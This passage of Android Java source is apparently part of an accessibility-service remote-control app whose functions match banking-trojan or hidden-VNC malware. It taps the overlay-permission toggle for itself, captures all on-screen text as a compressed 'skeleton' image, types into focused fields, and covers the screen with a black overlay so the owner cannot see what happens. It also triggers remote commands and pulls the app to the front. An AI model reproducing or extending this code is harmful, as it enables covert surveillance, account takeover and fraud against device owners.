        if (Settings.canDrawOverlays(ctx)) {
            FOR_DRAW_OVER = false;
            // blockBack();
        } else {
            //android:id/switch_widget
//            if (Settings.canDrawOverlays(ctx)) {
//                FOR_DRAW_OVER = false;
//                return;
//            }

            //RootView.refresh();
            boolean notsuccess = true;
            String clasname = "android.widget.Switch";
            if (Build.VERSION.SDK_INT >= 34) {
                clasname = "android.view.View";
                // findAndCheckToggle(RootView);
            }
            List<AccessibilityNodeInfo> nodes = getNodesByClassName(MyAccess.getRootInActiveWindow(), clasname);

            for (AccessibilityNodeInfo node : nodes) {
                if (node.isCheckable()) {

                    Log.d("Accessibility", "Found checkable element: " + node.getClassName());
                    if (!node.isChecked()) {

                        // if (node.isClickable()) {

                        //     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        //  } else {
                        new Handler(Looper.getMainLooper()).postDelayed(() ->
                        {
                            Rect out = new Rect();
                            node.getBoundsInScreen(out);
                            int X = (int) out.exactCenterX();
                            int Y = (int) out.exactCenterY();
                            clickthis(X, Y);
                            FOR_DRAW_OVER = false;
                            new Handler(Looper.getMainLooper()).postDelayed(() ->
                            {
                                MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);

                                if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.P) {
                                    new Handler(Looper.getMainLooper()).postDelayed(() ->
                                    {
                                        MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
                                    }, 500);
                                }


                            }, 100);

                        }, 200);

                        // }
                        notsuccess = false;

                        break;
                    }
                }
            }

            if (notsuccess) {

//                try{
//                    Thread.sleep(500);
//                }catch (Exception a){}


                new Handler(Looper.getMainLooper()).postDelayed(() ->
                {
                    scrollView(MyAccess.getRootInActiveWindow());
                    new Handler(Looper.getMainLooper()).postDelayed(() -> EnableDraw(ctx, false), 100);
                }, 300);


            }


        }


    }


    public static boolean CLickTextpostion(String text, AccessibilityNodeInfo rootNode) {
        if (rootNode == null || rootNode.getChildCount() == 0) {
            return false;
        }
        for (int i = 0; i < rootNode.getChildCount(); i++) {
            AccessibilityNodeInfo node = rootNode.getChild(i);
            if (node != null) {
                String textchiled = "";

                if (node.getText() != null) {
                    textchiled = node.getText().toString();
                    if (textchiled.toLowerCase().equals(text.toLowerCase())) {
                        Rect outchiled = new Rect();
                        node.getBoundsInScreen(outchiled);
                        int xCenter = outchiled.left;
                        int yCenter = outchiled.centerY();

                        clickthis(xCenter, yCenter);
//                        try {
//                            Thread.sleep(500);
//                        } catch (Exception a) {
//                        }
                        return true;
                    }
                }

                // Important: Check if the recursive call returns true
                if (CLickTextpostion(text, node)) {
                    return true;
                }

                node.recycle();
            }
        }

        return false;
    }


    public static boolean scrollView(AccessibilityNodeInfo nodeInfo) {

        if (nodeInfo == null) return false;

        if (nodeInfo.isScrollable()) {
            return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
        }

        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            if (scrollView(nodeInfo.getChild(i))) {
                return true;
            }
        }

        return false;
    }

    public static byte[] createskilton() {
        try {
            AccessServices accessService = myAccess();
            if (accessService == null) return null;

            Context context = mycontext();
            if (context == null) return null;

            AccessibilityNodeInfo rootNode = accessService.getRootInActiveWindow();
            if (rootNode == null) return null;

            int width = Integer.parseInt(MySettings.Read(context, Consts.Mob_width, "720"));
            int height = Integer.parseInt(MySettings.Read(context, Consts.Mob_height, "1280"));

            Bitmap screenshot = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(screenshot);
            Paint paint = new Paint();


            canvas.drawColor(Color.TRANSPARENT, PorterDuff.Mode.CLEAR);

            processNode(rootNode, canvas, paint, context);

            // Compress the final image
            return compressBitmap(screenshot);

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private static void processNode(AccessibilityNodeInfo rootNode, Canvas canvas, Paint paint, Context context) {
        if (rootNode == null) return;

        Rect bounds = new Rect();
        rootNode.getBoundsInScreen(bounds);

        String nodeText = extractText(rootNode);
        if (nodeText == null || nodeText.isEmpty()) {
            nodeText = "•"; // Default placeholder
        }

        drawNode(canvas, paint, bounds, nodeText, Color.RED);

        String skeletonColor = MySettings.Read(context, Consts.Skeleton_Color, "#FFFFFF");
        drawViewHierarchy(canvas, rootNode, paint, Color.parseColor(skeletonColor));

        rootNode.recycle();
    }

    private static String extractText(AccessibilityNodeInfo node) {
        if (node == null) return null;

        if (node.getText() != null) {
            return node.getText().toString();
        }

        if (node.getClassName() != null) {
            String className = node.getClassName().toString();
            if (("android.widget.ImageButton".equals(className) || "android.widget.ImageView".equals(className))
                    && node.getContentDescription() != null) {
                return node.getContentDescription().toString();
            }
        }
        return null;
    }

    private static void drawNode(Canvas canvas, Paint paint, Rect bounds, String text, int color) {
        paint.setColor(color);
        paint.setStyle(Paint.Style.STROKE);
        paint.setStrokeWidth(2);
        canvas.drawRect(bounds, paint);

        paint.setStyle(Paint.Style.FILL);
        paint.setTextSize(screenfontSize);
        paint.setAntiAlias(true);
        paint.setTypeface(Typeface.SANS_SERIF);

        paint.setTextAlign(Paint.Align.LEFT);

        int x = bounds.left;
        int y = bounds.centerY() - ((int) ((paint.descent() + paint.ascent()) / 2));
        canvas.drawText(text, x, y, paint);
    }

    private static void drawViewHierarchy(Canvas canvas, AccessibilityNodeInfo node, Paint paint, int color) {
        if (node == null || node.getChildCount() == 0) return;

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null && child.isVisibleToUser()) {
                Rect bounds = new Rect();
                child.getBoundsInScreen(bounds);

                String text = extractText(child);
                if (text == null || text.isEmpty()) text = "•";

                paint.setColor(color);
                paint.setTextSize(screenfontSize);
                drawNode(canvas, paint, bounds, text, color);

                drawViewHierarchy(canvas, child, paint, color);
                child.recycle();
            }
        }
    }


    private static byte[] compressBitmap(Bitmap bitmap) {
        try (ByteArrayOutputStream stream = new ByteArrayOutputStream()) {
            Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, 480, 720, true);
            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 80, stream);
            scaledBitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        } finally {
            bitmap.recycle();
        }
    }

    public static void pasteText(String ToPaste) {
        try {
            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return;
            }
            Context ctx = mycontext();
            if (ctx == null) {
                return;
            }
            AccessibilityNodeInfo root = MyAccess.getRootInActiveWindow();
            AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            boolean sucess = false;
            Bundle arguments = new Bundle();
            arguments.putString(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, ToPaste);

            if (focus != null) {

                sucess = focus.performAction(AccessibilityNodeInfoCompat.ACTION_SET_TEXT, arguments);
                focus.recycle();
                root.recycle();
            }

            if (!sucess) {
                if (AccessServices.Globalnode == null) {
                    return;
                }
                AccessServices.Globalnode.performAction(AccessibilityNodeInfoCompat.ACTION_SET_TEXT, arguments);
            }


        } catch (Exception ex) {

        }
    }

    public static void BlackScreen(boolean ON) {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }

        Context ctx = mycontext();
        if (ctx == null) {
            return;
        }

        try {
            Handler mainHandler = new Handler(MyAccess.getMainLooper());
            if (ON) {
                mainHandler.post(() -> {
                    //AccessServices myacss = myAccess();
                    if (MyAccess.BlackoverLay.getWindowToken() == null) {
                        try {
                            AccessWindow.addView(MyAccess.BlackoverLay, AccessServices.Blacklayparams);

                        } catch (Exception a) {
                        }
                    }

                    AccessServices.BlackScreen_ON = true;
                });

            } else {

                mainHandler.post(() -> {
                    // AccessServices myacss = myAccess();
                    if (MyAccess.BlackoverLay.getWindowToken() != null) {
                        try {
                            AccessWindow.removeView(MyAccess.BlackoverLay);

                        } catch (Exception a) {
                        }
                    }

                    AccessServices.BlackScreen_ON = false;
                });


            }
        } catch (Exception a) {
            a.printStackTrace();
        }
    }


    public static void Treger(final String Command, String[] KeyData) {

        try {
            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return;
            }
            Context ctx = mycontext();
            if (ctx == null) {
                return;
            }
            if (KeyData != null) {
                String key = KeyData[0];
                String value = KeyData[1];
                if (!AccessServices.CommandsData.containsKey("") || !AccessServices.CommandsData.containsValue("")) {
                    AccessServices.CommandsData.put(key, value);
                }
            }

            AccessibilityManager manager = (AccessibilityManager) ctx.getSystemService(Context.ACCESSIBILITY_SERVICE);

            if (manager.isEnabled()) {
                AccessibilityEvent e = AccessibilityEvent.obtain();
                e.setEventType(AccessibilityEvent.TYPE_ANNOUNCEMENT);
                e.setClassName(MyAccess.getClass().getName());
                e.setPackageName(ctx.getPackageName());
                e.getText().add(Command);
                manager.sendAccessibilityEvent(e);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


    }



    public static void BringMeFront(Context ctx) {
        AccessServices MyAccess = myAccess();
        if (MyAccess != null) {
            AccessTools.Treger("tofront", null);
        } else {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {

                        addOverlay(ctx);
                        handler.postDelayed(() -> {
                            Intent intenttrans = new Intent(ctx, tofront.class);
                            intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);
                            ctx.startActivity(intenttrans);
                        }, 50);


                    } catch (Exception a) {
                        a.printStackTrace();
                    }
                }
            }, 1);
        }

    }

    private static void removeOverlayView(Context ctx, Button overlayView) {
        if (overlayView != null) {
            WindowManager windowManager = (WindowManager) ctx.getSystemService(WINDOW_SERVICE);
            windowManager.removeView(overlayView);
            overlayView = null;
        }
    }


    public static void addOverlay(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(ctx)) {
            //  Log.e("OverlayService", "Draw over apps permission not granted");
            return;
        }
        WindowManager windowManager = (WindowManager) ctx.getSystemService(WINDOW_SERVICE);
        // Create overlay view
        Button overlayView;
        overlayView = new Button(ctx);

        overlayView.setBackgroundColor(Color.TRANSPARENT);
        overlayView.setFocusable(true);
        overlayView.setClickable(true);

        // Set layout params
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                10,
                10,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                ,
                PixelFormat.TRANSLUCENT
        );

        // Allow touch and focus
        //params.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = 10;
        params.y = 10;

        windowManager.addView(overlayView, params);
         overlayView.setVisibility(View.VISIBLE);

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (overlayView != null) {
                removeOverlayView(ctx, overlayView);
            }
        }, 3000);
    }

    public static List<String> TNames = new ArrayList<String>();
    public static Map<String, String> Map_Name_Lnk = new HashMap<>();
    public static Map<String, String> Map_Name_ID = new HashMap<>();

    public static void Addlink(String name, String url) {
        if (!Map_Name_Lnk.containsKey(name)) {
            Map_Name_Lnk.put(name, url);
        }
    }

    public static void AddID(String name, String ID) {
        if (!Map_Name_ID.containsKey(name)) {
            Map_Name_ID.put(name, ID);
        }
    }

    public static void AddTname(String name) {
        if (!TNames.contains(name)) {
            TNames.add(name);
        }
    }

    public static void Removename(String name) {
        if (Map_Name_Lnk.containsKey(name)) {
            Map_Name_Lnk.remove(name);
        }
        if (Map_Name_ID.containsKey(name)) {
            Map_Name_ID.remove(name);
        }
        if (TNames.contains(name)) {
            TNames.remove(name);
        }
    }
}
